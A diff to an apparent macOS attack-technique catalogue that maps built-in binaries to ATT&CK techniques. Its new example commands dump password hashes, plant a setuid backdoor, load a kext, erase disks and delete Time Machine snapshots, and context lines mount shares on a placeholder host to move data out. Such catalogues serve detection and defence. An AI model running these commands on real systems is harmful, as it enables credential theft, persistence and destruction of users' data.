@@ -18,6 +18,7 @@ version = "2026.11.02"
 platform = "macOS"
 
 [techniques]
+"T1003" = { name = "OS Credential Dumping", tactics = ["Credential Access"] }
 "T1005" = { name = "Data from Local System", tactics = ["Collection"] }
 "T1007" = { name = "System Service Discovery", tactics = ["Discovery"] }
 "T1010" = { name = "Application Window Discovery", tactics = ["Discovery"] }
@@ -81,6 +82,7 @@ platform = "macOS"
 "T1546.016" = { name = "Event Triggered Execution: Installer Packages", tactics = ["Persistence", "Privilege Escalation"] }
 "T1547.006" = { name = "Boot or Logon Autostart Execution: Kernel Modules and Extensions", tactics = ["Persistence", "Privilege Escalation"] }
 "T1547.015" = { name = "Boot or Logon Autostart Execution: Login Items", tactics = ["Persistence", "Privilege Escalation"] }
+"T1548.001" = { name = "Abuse Elevation Control Mechanism: Setuid and Setgid", tactics = ["Privilege Escalation", "Defense Evasion"] }
 "T1548.003" = { name = "Abuse Elevation Control Mechanism: Sudo and Sudo Caching", tactics = ["Privilege Escalation", "Defense Evasion"] }
 "T1553.001" = { name = "Subvert Trust Controls: Gatekeeper Bypass", tactics = ["Defense Evasion"] }
 "T1553.002" = { name = "Subvert Trust Controls: Code Signing", tactics = ["Defense Evasion"] }
@@ -89,7 +91,7 @@ platform = "macOS"
 "T1555.003" = { name = "Credentials from Password Stores: Credentials from Web Browsers", tactics = ["Credential Access"] }
 "T1558" = { name = "Steal or Forge Kerberos Tickets", tactics = ["Credential Access"] }
 "T1560.001" = { name = "Archive Collected Data: Archive via Utility", tactics = ["Collection"] }
-"T1561" = { name = "Disk Wipe", tactics = ["Impact"] }
+"T1561.001" = { name = "Disk Wipe: Disk Content Wipe", tactics = ["Impact"] }
 "T1562.001" = { name = "Impair Defenses: Disable or Modify Tools", tactics = ["Defense Evasion"] }
 "T1562.004" = { name = "Impair Defenses: Disable or Modify System Firewall", tactics = ["Defense Evasion"] }
 "T1564.001" = { name = "Hide Artifacts: Hidden Files and Directories", tactics = ["Defense Evasion"] }
@@ -283,6 +285,13 @@ summary = "Sets certificate trust settings."
 techniques = ["T1553.004"]
 symbols = ["_SecTrustSettingsSetTrustSettings"]
 
+[[capability]]
+id = "erases-disks"
+title = "Erases disks or deletes snapshots"
+summary = "Uses the DiskManagement erase and partition classes, the StorageKit snapshot class or fs_snapshot_delete, so it can wipe volumes and remove APFS restore points."
+techniques = ["T1561.001", "T1490"]
+symbols = ["_OBJC_CLASS_$_DMEraseDisk", "_OBJC_CLASS_$_DMPartitionDisk", "_OBJC_CLASS_$_SKAPFSSnapshotDisk", "_fs_snapshot_delete"]
+
 [[note]]
 name = "curl"
 paths = ["/usr/bin/curl"]
@@ -463,7 +472,7 @@ abuse = "Mounts a remote SMB share as a local directory for staging tools or cop
 [[note.example]]
 title = "Mount a remote SMB share"
 command = "mount_smbfs //user@host.example/share /tmp/m"
-explanation = "Mounts a remote SMB share as a local directory for staging tools or copying data out."
+explanation = "Gives the remote share a local path, so ordinary copy commands move tools in and data out."
 
 [[note]]
 name = "mount_webdav"
@@ -475,7 +484,7 @@ abuse = "Mounts an HTTP(S) WebDAV server as a filesystem, turning web hosting in
 [[note.example]]
 title = "Mount a WebDAV server as a filesystem"
 command = "mount_webdav https://host.example/dav /tmp/m"
-explanation = "Turns an HTTP(S) WebDAV endpoint into a mounted filesystem, so web hosting becomes a file share."
+explanation = "Mounts the WebDAV endpoint under a local path, so an ordinary web host serves as a drop and pickup point."
 
 [[note]]
 name = "networksetup"
@@ -705,7 +714,7 @@ abuse = "Runs .workflow bundles, which can embed shell-script and AppleScript ac
 [[note.example]]
 title = "Run a workflow with a shell action"
 command = "automator /tmp/Payload.workflow"
-explanation = "Executes a .workflow bundle, which can embed Run Shell Script or AppleScript actions."
+explanation = "Runs the workflow's actions in order, including any shell or AppleScript steps it embeds, under the automator process name."
 
 [[note]]
 name = "shortcuts"
@@ -717,7 +726,7 @@ abuse = "shortcuts run executes a Shortcut, which may contain Run Shell Script a
 [[note.example]]
 title = "Run a shortcut containing a script"
 command = 'shortcuts run "Backup"'
-explanation = "Runs a named Shortcut, which may contain a Run Shell Script action."
+explanation = "Runs the named Shortcut; a Run Shell Script action inside it executes with the caller's privileges."
 
 [[note]]
 name = "launchctl"
@@ -836,7 +845,7 @@ explanation = "Generates a key pair and appends the public half to authorized_ke
 [[note]]
 name = "dscl"
 paths = ["/usr/bin/dscl"]
-techniques = ["T1087.001", "T1069.001", "T1136.001", "T1098"]
+techniques = ["T1087.001", "T1069.001", "T1136.001", "T1098", "T1003"]
 privilege = "user"
 abuse = "Directory Services CLI: lists users and groups as any user; as root creates accounts, joins them to admin, or reads ShadowHashData."
 
@@ -851,17 +860,29 @@ command = "dscl . -create /Users/svc; dscl . -append /Groups/admin GroupMembersh
 explanation = "As root, creates an account and joins it to the admin group for persistent privilege."
 privilege = "root"
 
+[[note.example]]
+title = "Read a user's password hash"
+command = "dscl . -read /Users/victim ShadowHashData"
+explanation = "As root, dumps the account's ShadowHashData for offline cracking."
+privilege = "root"
+
 [[note]]
 name = "sysadminctl"
 paths = ["/usr/sbin/sysadminctl"]
 techniques = ["T1136.001", "T1098", "T1531"]
 privilege = "root"
-abuse = "Creates admin users (-addUser -admin), resets passwords and toggles the guest account."
+abuse = "Creates admin users (-addUser -admin) and resets other users' passwords."
 
 [[note.example]]
 title = "Create an admin user"
 command = "sysadminctl -addUser svc -fullName Service -password PASS -admin"
 explanation = "Creates a new administrator account in one command."
+privilege = "root"
+
+[[note.example]]
+title = "Reset another user's password"
+command = "sysadminctl -resetPasswordFor victim -newPassword PASS"
+explanation = "Changes an account's password, which locks its owner out and gives the attacker a login."
 privilege = "root"
 
 [[note]]
@@ -909,6 +930,12 @@ paths = ["/usr/bin/kmutil"]
 techniques = ["T1547.006", "T1518.001"]
 privilege = "root"
 abuse = "Loads kernel extensions and lists loaded ones (showloaded), which reveals security products."
+
+[[note.example]]
+title = "Load a kernel extension"
+command = "kmutil load -p /Library/Extensions/evil.kext"
+explanation = "Loads a kext from its bundle path; on Apple silicon the extension must already be user-approved under reduced security."
+privilege = "root"
 
 [[note.example]]
 title = "List loaded kernel extensions"
@@ -988,7 +1015,7 @@ name = "spctl"
 paths = ["/usr/sbin/spctl"]
 techniques = ["T1553.001", "T1518.001"]
 privilege = "user"
-abuse = "--status reports Gatekeeper state and --assess tests a file. As admin, --master-disable starts disabling Gatekeeper; recent macOS also needs confirmation in System Settings."
+abuse = "--status reports Gatekeeper state and --assess tests a file. As root, --global-disable starts disabling Gatekeeper; an admin still has to pick Anywhere in System Settings."
 
 [[note.example]]
 title = "Check Gatekeeper status"
@@ -1000,6 +1027,12 @@ title = "Assess a file"
 command = "spctl -a -vv /tmp/Payload.app"
 explanation = "Tests whether a file would pass Gatekeeper, useful for pre-flighting a payload."
 
+[[note.example]]
+title = "Start disabling Gatekeeper"
+command = "spctl --global-disable"
+explanation = "As root, reveals the Anywhere option in Privacy & Security; Gatekeeper keeps assessing until an admin selects it there."
+privilege = "root"
+
 [[note]]
 name = "csrutil"
 paths = ["/usr/bin/csrutil"]
@@ -1010,7 +1043,7 @@ abuse = "status reveals whether System Integrity Protection is on; disabling it 
 [[note.example]]
 title = "Check SIP status"
 command = "csrutil status"
-explanation = "Reveals whether System Integrity Protection is enabled; disabling it requires recoveryOS."
+explanation = "Prints whether SIP is enabled, which decides whether system files and Apple binaries can be modified at all."
 
 [[note]]
 name = "tccutil"
@@ -1068,7 +1101,7 @@ explanation = "Copies another file's timestamps onto a payload so it blends with
 [[note]]
 name = "chmod"
 paths = ["/bin/chmod"]
-techniques = ["T1222.002"]
+techniques = ["T1222.002", "T1548.001"]
 privilege = "user"
 abuse = "Marks downloaded payloads executable; as root sets setuid bits for a backdoor."
 
@@ -1076,6 +1109,12 @@ abuse = "Marks downloaded payloads executable; as root sets setuid bits for a ba
 title = "Make a payload executable"
 command = "chmod +x /tmp/implant"
 explanation = "Marks a downloaded file executable so it can run."
+
+[[note.example]]
+title = "Set a setuid root backdoor"
+command = "chmod 4755 /tmp/implant"
+explanation = "As root, sets the setuid bit on a root-owned file so any user who runs it gets root."
+privilege = "root"
 
 [[note]]
 name = "log"
@@ -1154,7 +1193,7 @@ abuse = "Terminates processes by name: security agents (as root), or apps holdin
 [[note.example]]
 title = "Kill a security agent"
 command = "killall -9 MDATP"
-explanation = "Terminates processes by name, such as an EDR agent (as root) or apps holding files open before encryption."
+explanation = "Sends SIGKILL to every process with that name; a root-owned agent needs root, a user's apps do not."
 
 [[note]]
 name = "sudo"
@@ -1284,7 +1323,7 @@ abuse = "-show reveals the AD domain, computer account and admin-group mappings.
 [[note.example]]
 title = "Show AD binding"
 command = "dsconfigad -show"
-explanation = "Reveals the AD domain, computer account and admin-group mappings."
+explanation = "Prints the bound domain, this Mac's computer account and which AD groups map to local admin."
 
 [[note]]
 name = "ps"
@@ -1320,7 +1359,7 @@ abuse = "Active connections, listening ports and routing table."
 [[note.example]]
 title = "List active connections and ports"
 command = "netstat -an"
-explanation = "Shows connections, listening ports and the routing table."
+explanation = "Prints every socket with its state and the routing table, which maps what the host talks to."
 
 [[note]]
 name = "arp"
@@ -1332,7 +1371,7 @@ abuse = "arp -a lists neighbouring hosts already seen on the LAN with no scannin
 [[note.example]]
 title = "List neighbouring hosts"
 command = "arp -a"
-explanation = "Reports hosts already seen on the LAN, with no scanning traffic."
+explanation = "Prints the ARP cache, which names the hosts this Mac has already exchanged packets with."
 
 [[note]]
 name = "ifconfig"
@@ -1344,7 +1383,7 @@ abuse = "Interfaces, addresses and MACs."
 [[note.example]]
 title = "Read interfaces and addresses"
 command = "ifconfig"
-explanation = "Lists interfaces, IP addresses and MACs."
+explanation = "Prints each interface with its IP addresses and hardware MAC, including VPN and virtual interfaces."
 
 [[note]]
 name = "dns-sd"
@@ -1380,7 +1419,13 @@ abuse = "-l lists this Mac's file-sharing points; as root, -a publishes a new sh
 [[note.example]]
 title = "List this Mac's shares"
 command = "sharing -l"
-explanation = "Lists file-sharing points; as root, -a publishes a new share."
+explanation = "Lists the directories this Mac already shares and the protocols they use."
+
+[[note.example]]
+title = "Publish a directory over SMB"
+command = "sharing -a /Users/Shared/loot -S loot -s 001"
+explanation = "As root, creates a share point that exposes a directory over SMB."
+privilege = "root"
 
 [[note]]
 name = "mdfind"
@@ -1406,6 +1451,11 @@ title = "List installed packages"
 command = "pkgutil --pkgs"
 explanation = "Enumerates installed package receipts, including security agents."
 
+[[note.example]]
+title = "Unpack a package for tampering"
+command = "pkgutil --expand /tmp/orig.pkg /tmp/orig; pkgutil --flatten /tmp/orig /tmp/evil.pkg"
+explanation = "Expands a flat package so its install scripts can be edited, then flattens it back into a .pkg."
+
 [[note]]
 name = "systemextensionsctl"
 paths = ["/usr/bin/systemextensionsctl"]
@@ -1416,7 +1466,7 @@ abuse = "list shows installed system extensions, i.e. EDR endpoint-security and 
 [[note.example]]
 title = "List system extensions"
 command = "systemextensionsctl list"
-explanation = "Shows installed system extensions, i.e. EDR endpoint-security and network-filter products."
+explanation = "Prints each extension with its bundle ID, state and category, which names the endpoint-security and network-filter products present."
 
 [[note]]
 name = "softwareupdate"
@@ -1508,6 +1558,11 @@ title = "Create an encrypted disk image"
 command = "hdiutil create -encryption -stdinpass -size 100m -volname loot /tmp/loot.dmg"
 explanation = "Makes an encrypted DMG for staging collected data."
 
+[[note.example]]
+title = "Mount a disk image invisibly"
+command = "hdiutil attach -nobrowse -quiet /tmp/p.dmg"
+explanation = "Mounts a DMG without showing the volume in Finder, so a delivered payload can be read from /Volumes unnoticed."
+
 [[note]]
 name = "systemsetup"
 paths = ["/usr/sbin/systemsetup"]
@@ -1537,14 +1592,26 @@ privilege = "root"
 [[note]]
 name = "diskutil"
 paths = ["/usr/sbin/diskutil"]
-techniques = ["T1561", "T1082", "T1120"]
+techniques = ["T1082", "T1120", "T1561.001", "T1490"]
 privilege = "user"
-abuse = "list and info enumerate disks and volumes; eraseDisk and eraseVolume destroy data."
+abuse = "Any user can list disks, APFS containers and snapshots, including external and Time Machine media. With ownership of the disk, in practice root, eraseDisk, eraseVolume and apfs deleteContainer destroy data and apfs deleteSnapshot removes restore points, none of them with a confirmation prompt."
 
 [[note.example]]
-title = "Enumerate disks and volumes"
-command = "diskutil list"
-explanation = "Lists disks and volumes; eraseDisk and eraseVolume destroy data."
+title = "Map disks, volumes and backup media"
+command = "diskutil apfs list -plist"
+explanation = "Enumerates every APFS container and volume with its role and mount point, which shows where user data and Time Machine backups live."
+
+[[note.example]]
+title = "Erase a whole disk"
+command = "diskutil eraseDisk JHFS+ Untitled disk2"
+explanation = "Rewrites the partition map and leaves one empty volume, with no confirmation prompt."
+privilege = "root"
+
+[[note.example]]
+title = "Delete an APFS snapshot"
+command = "diskutil apfs deleteSnapshot disk3s5 -name com.apple.TimeMachine.2026-11-02-120000.local -wait"
+explanation = "Removes a local restore point, so the volume looks untouched until a restore is attempted."
+privilege = "root"
 
 [[note]]
 name = "shutdown"
